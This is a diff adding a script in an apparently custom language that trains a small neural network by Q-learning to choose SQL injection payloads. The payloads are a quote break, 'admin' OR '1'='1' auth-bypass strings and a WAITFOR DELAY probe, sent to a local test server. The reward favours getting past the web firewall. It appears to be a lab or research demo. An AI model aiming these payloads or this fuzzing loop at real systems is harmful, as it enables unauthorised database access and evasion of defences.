@@ -1,0 +1,130 @@
+import "lib/micrograd.donk";
+
+// ---------------------------------------------------------------- Network Definitions
+// (Copying mlp_init, mlp_forward, mlp_parameters from train_big_mlp.donk)
+// Assuming they are available or included in this file...
+let PRNG = [12345.0];
+fn rand_weight() {
+    PRNG[0] = (1103515245.0 * PRNG[0] + 12345.0) % 2147483648.0;
+    return (PRNG[0] / 2147483648.0) * 2.0 - 1.0; 
+}
+fn neuron_init(nin) {
+    let w = []; let i = 0; while i < nin { push(w, value_make(rand_weight())); i = i + 1; }
+    return [w, value_make(rand_weight())];
+}
+fn layer_init(nin, nout) {
+    let neurons = []; let i = 0; while i < nout { push(neurons, neuron_init(nin)); i = i + 1; }
+    return neurons;
+}
+fn mlp_init(sizes) {
+    let layers = []; let i = 0; while i < len(sizes) - 1 { push(layers, layer_init(sizes[i], sizes[i+1])); i = i + 1; }
+    return layers;
+}
+fn neuron_forward(n, xs) {
+    let w = n[0]; let act = n[1]; let i = 0;
+    while i < len(w) { act = value_add(act, value_mul(w[i], xs[i])); i = i + 1; }
+    return value_tanh(act);
+}
+fn layer_forward(l, xs) {
+    let out = []; let i = 0; while i < len(l) { push(out, neuron_forward(l[i], xs)); i = i + 1; }
+    return out;
+}
+fn mlp_forward(m, xs) {
+    let curr = xs; let i = 0; while i < len(m) { curr = layer_forward(m[i], curr); i = i + 1; }
+    return curr; // Return the full array of output nodes
+}
+fn mlp_parameters(m) {
+    let p = []; let i = 0;
+    while i < len(m) {
+        let j = 0; while j < len(m[i]) {
+            let k = 0; while k < len(m[i][j][0]) { push(p, m[i][j][0][k]); k = k + 1; }
+            push(p, m[i][j][1]); j = j + 1;
+        }
+        i = i + 1;
+    }
+    return p;
+}
+
+// ---------------------------------------------------------------- Environment
+
+fn get_payload(action_idx) {
+    if action_idx == 0.0 { return "%27"; }                          // Single quote (Syntax break)
+    if action_idx == 1.0 { return "admin%27%20OR%20%271%27%3D%271"; } // URL-encoded Auth bypass
+    if action_idx == 2.0 { return "admin' OR '1'='1"; }             // Standard Auth bypass
+    if action_idx == 3.0 { return "WAITFOR%20DELAY%20%270%3A0%3A3%27"; } // Time delay
+    return "benign_user";                                           // Default / Control
+}
+
+fn argmax(q_values) {
+    let max_v = q_values[0][0];
+    let max_i = 0.0;
+    let i = 1;
+    while i < len(q_values) {
+        if q_values[i][0] > max_v {
+            max_v = q_values[i][0];
+            max_i = i;
+        }
+        i = i + 1;
+    }
+    return max_i;
+}
+
+// ---------------------------------------------------------------- Training Loop
+
+// Model: 1 input (dummy state), 8 hidden, 5 outputs (actions)
+let model = mlp_init([1, 8, 5]);
+let params = mlp_parameters(model);
+let lr = 0.1;
+let episodes = 50;
+let e = 0;
+
+print("[*] Starting AI Fuzzing Loop...");
+
+while e < episodes {
+    // 1. Forward Pass (State is a dummy constant for stateless fuzzing)
+    let state = [value_make(1.0)];
+    let q_values = mlp_forward(model, state);
+    
+    // 2. Select highest confidence action
+    let action_idx = argmax(q_values);
+    let payload = get_payload(action_idx);
+    
+    // 3. I/O: Execute attack
+    let url = "http://127.0.0.1:8081/" + payload;
+    let res = http_request(url);
+    let status = http_status();
+    
+    // 4. Calculate Reward based on target_server.py logic
+    let reward = 0.0;
+    if status == 403.0 { reward = -1.0; } // Punish WAF blocks
+    if status == 500.0 { reward = 0.5; }  // Mild reward for breaking syntax
+    if status == 200.0 { reward = 1.0; }  // Maximum reward for bypass/execution
+    
+    // 5. Calculate Loss: We want the Q-value of the chosen action to match the reward
+    // Loss = (Q_chosen - reward)^2
+    let q_chosen = q_values[action_idx];
+    let target = value_make(reward);
+    let diff = value_sub(q_chosen, target);
+    let loss = value_pow(diff, 2.0);
+    
+    // 6. Backprop
+    let p = 0;
+    while p < len(params) { params[p][1] = 0.0; p = p + 1; }
+    value_backward(loss);
+    
+    // 7. Gradient Descent
+    p = 0;
+    while p < len(params) { 
+        params[p][0] = params[p][0] - lr * params[p][1]; 
+        p = p + 1; 
+    }
+    
+    print("--- Ep ---");
+    print(e);
+    print("Action / Status / Loss:");
+    print(action_idx);
+    print(status);
+    print(loss[0]);
+    
+    e = e + 1;
+}
